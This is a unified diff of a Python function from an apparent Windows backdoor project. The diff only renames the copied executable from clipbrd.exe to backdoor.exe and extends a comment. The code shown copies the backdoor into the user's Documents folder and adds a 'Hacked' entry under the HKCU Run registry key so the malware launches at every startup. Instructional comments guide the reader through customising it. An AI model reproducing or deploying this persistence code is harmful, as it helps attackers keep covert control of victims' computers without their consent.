@@ -25,15 +25,15 @@ def persistence():
     Null, userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')  # Get userprofile
 
     # Place where you wish your backdoor to be copied , here it is C:\Users\<UserName>\Documents
-    destination = userprof.strip('\n\r') + '\\Documents' + '\clipbrd.exe'
+    destination = userprof.strip('\n\r') + '\\Documents' + '\backdoor.exe'
 
     if not os.path.exists(destination):
-        shutil.copyfile(path + '\clipbrd.exe', destination)
+        shutil.copyfile(path + '\backdoor.exe', destination)
         # This is one of the keys that allows to run on startup , others can be found using
         # sysinternals tools and other methods like googling
         key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",
                            0, wreg.KEY_ALL_ACCESS)
-        # Hacked is the key name that will run our backdoor on startup
+        # Hacked is the key name that will run our backdoor on startup , you can keep whatever you wish
         wreg.SetValueEx(key, 'Hacked', 0, wreg.REG_SZ, destination)
         key.Close()
 
